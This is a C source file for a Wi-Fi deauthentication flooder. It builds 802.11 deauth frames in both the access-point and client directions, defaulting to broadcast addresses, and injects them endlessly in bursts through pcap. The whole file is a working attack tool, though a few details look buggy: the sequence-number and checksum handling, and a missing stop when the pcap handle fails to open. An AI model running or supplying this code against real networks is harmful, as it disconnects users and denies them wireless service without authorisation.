#ifndef __CRADIO_C
#define __CRADIO_C
#include "cradio.h"

uint32_t calc_crc(uint8_t *inp, uint32_t len)
{
    uint32_t crc = 0xffffffff;
    for (uint32_t i = 0; i < len; i++)
	crc = crc_tbl[(crc ^ inp[i]) & 0xff] ^ (crc >> 8);
    
    crc = ~crc;
    return crc;
}

void mac_to_bytes(uint8_t *inp, uint8_t *outp)
{
    outp[0] = (uint8_t)(strtol((const char*)inp+0, NULL, 16) & 0xff);
    outp[1] = (uint8_t)(strtol((const char*)inp+3, NULL, 16) & 0xff);
    outp[2] = (uint8_t)(strtol((const char*)inp+6, NULL, 16) & 0xff);
    outp[3] = (uint8_t)(strtol((const char*)inp+9, NULL, 16) & 0xff);
    outp[4] = (uint8_t)(strtol((const char*)inp+12, NULL, 16) & 0xff);
    outp[5] = (uint8_t)(strtol((const char*)inp+15, NULL, 16) & 0xff);
    
}

uint16_t htoles(uint16_t v)
{
    uint16_t t = 0x0001;
    /* check 8 LSBs of `t` . if s[7:0] = \x00, host is BE and need to convert to LE */
    if (*((uint8_t*)&t) == 0x00)
	return ((v>>0x08)|(v<<0x08));
    
    /* host is LE: v is good to go. */
    return v;
}


void IEEE80211_frame_to_bytestr(IEEE80211_generic_t *pkt, uint8_t *outp)
{
    outp[0] = pkt->frame_control & 0xff;
    outp[1] = (pkt->frame_control >> 8) & 0xff;
    outp[2] = (pkt->duration_id) & 0xff;
    outp[3] = (pkt->duration_id >> 8) & 0xff;
    memcpy((void*)outp+4, (void*)pkt->dest_addr, ETHER_ADDR_LEN);
    memcpy((void*)outp+10, (void*)pkt->src_addr,ETHER_ADDR_LEN);
    memcpy((void*)outp+16, (void*)pkt->bssid, ETHER_ADDR_LEN);
    outp[22] = pkt->seq_ctl & 0xff;
    outp[23] = (pkt->seq_ctl >> 8) & 0xff;
    outp[24] = (pkt->reason_code) & 0xff;
    outp[25] = (pkt->reason_code >> 8) & 0xff;
    *((uint32_t*)(outp+26)) = pkt->fcs;
}

void set_deauth_fields(IEEE80211_generic_t *pkt)
{
    if (pkt == NULL)
	return;
    pkt->frame_control = 0x00C0;
    pkt->duration_id = 0x013A;
    pkt->seq_ctl = 0x0000;
    pkt->reason_code = 0x0007;
    
    pkt->frame_control = htoles(pkt->frame_control);
    pkt->duration_id = htoles(pkt->duration_id);
    pkt->seq_ctl = htoles(pkt->seq_ctl);
    pkt->reason_code = htoles(pkt->reason_code);
    pkt->fcs = 0x00000000;
}

void preprocess_frames(IEEE80211_generic_t *client_pkt, IEEE80211_generic_t *ap_pkt)
{
    set_deauth_fields(client_pkt);
    set_deauth_fields(ap_pkt);
}

void set_fcs(uint8_t *pkt)
{
    *(pkt+26) = (uint8_t)calc_crc(pkt,26);;
}

void update_seqn(uint8_t *pkt, uint64_t seqn)
{
    pkt[22] = (((seqn & 0x0f) << 4) | 0x00);
    pkt[23] = (((seqn & 0xf00) >> 4)|((seqn & 0xf0) >> 4));
    set_fcs(pkt);
}

void IEEE80211_frame_send(IEEE80211_generic_t *client_pkt, IEEE80211_generic_t *ap_pkt, pcap_t *handle, int64_t max_count)
{
    size_t pktlen = 30 + sizeof(radiotap_header);
    uint64_t n_pkts_sent = 0;
    uint8_t *client_pkt_bytestr = (uint8_t*) malloc(pktlen);
    uint8_t *ap_pkt_bytestr = (uint8_t*) malloc(pktlen);
    
    IEEE80211_frame_to_bytestr(client_pkt, client_pkt_bytestr + sizeof(radiotap_header));
    IEEE80211_frame_to_bytestr(ap_pkt, ap_pkt_bytestr + sizeof(radiotap_header));
    
    memcpy(client_pkt_bytestr, radiotap_header, sizeof(radiotap_header));
    memcpy(ap_pkt_bytestr, radiotap_header, sizeof(radiotap_header));
    
    struct timespec sleeptime;
    if (max_count == 0) printf("\n\n[!] Sending no packets");
    else if (max_count < 0) printf("\n\n[!] sending packets in chunks of %d per %dms.\n\n", PACKETS_PER_BURST, SLEEP_TIME_MS);
    else if (max_count == 1) printf("\n\n[!] sending 1 packet\n\n");
    else printf("\n\n[!] sending %ld packets in bursts of %d per %dms.\n\n", max_count, PACKETS_PER_BURST, SLEEP_TIME_MS);
    
    sleeptime.tv_sec = 0;
    sleeptime.tv_nsec = SLEEP_TIME_MS * 1000000;
    
    while (n_pkts_sent < (uint64_t)max_count || max_count < 0) {
	if (n_pkts_sent % (PACKETS_PER_BURST * BURST_SIZE) == 0)
	    printf("[+] %d packets sent.\n", (PACKETS_PER_BURST * BURST_SIZE));
	if (n_pkts_sent % PACKETS_PER_BURST == 0)
	    nanosleep(&sleeptime, NULL);
	update_seqn(client_pkt_bytestr, pktlen);
	update_seqn(ap_pkt_bytestr, pktlen);
	pcap_inject(handle, client_pkt_bytestr, pktlen);
	pcap_inject(handle, ap_pkt_bytestr, pktlen);
	n_pkts_sent++;
    }
    printf("\n\n[!] all packets sent.\n\n");
    
    // free memory
    free(ap_pkt_bytestr);
    free(client_pkt_bytestr); 
}

int main(int argc, char* argv[])
{
    uint8_t iface[] = DEFAULT_IFACE;
    int64_t n_pkts = -1, args_iface = 0, args_ap_mac = 0, args_cl_mac = 0;
    
    uint8_t cl_mac[] = BROADCAST_MAC;
    uint8_t ap_mac[] = BROADCAST_MAC;
    uint8_t errbuf[100];
    

    /* suppress unused variable warnings */
    (void)args_iface;
    (void)args_ap_mac;
    (void)argc;
    (void)argv;

    /* declare and alloc memory for two IEEE80211 frames */
    IEEE80211_generic_t *client_pkt;
    IEEE80211_generic_t *ap_pkt;
    client_pkt = (IEEE80211_generic_t*)malloc(sizeof(IEEE80211_generic_t));
    ap_pkt = (IEEE80211_generic_t*)malloc(sizeof(IEEE80211_generic_t));
    
    /* zero the frames */
    memset(ap_pkt, 0x00, sizeof(IEEE80211_generic_t));
    memset(client_pkt, 0x00, sizeof(IEEE80211_generic_t));
   
    /* copy in MAC address fields */ 
    mac_to_bytes(ap_mac, client_pkt->src_addr);
    mac_to_bytes(ap_mac, client_pkt->bssid);
    mac_to_bytes(ap_mac, ap_pkt->dest_addr);
    mac_to_bytes(ap_mac, ap_pkt->bssid);
    mac_to_bytes(cl_mac, client_pkt->dest_addr);
    mac_to_bytes(cl_mac, ap_pkt->src_addr);
    
    args_cl_mac |= 1;
    n_pkts = -1;
    
    preprocess_frames(client_pkt, ap_pkt);
    
    pcap_t *handle = pcap_open_live((const char*)iface, BUFSIZ, 1, 1000, (char*)errbuf);
    
    if (handle == NULL)
	printf("Error opening pcap handle: %s\n", errbuf);
    
    IEEE80211_frame_send(client_pkt, ap_pkt, handle, n_pkts);
    
    /* cleanup */
    pcap_close(handle);
    free(client_pkt);
    free(ap_pkt);
    return 0;
}
#endif
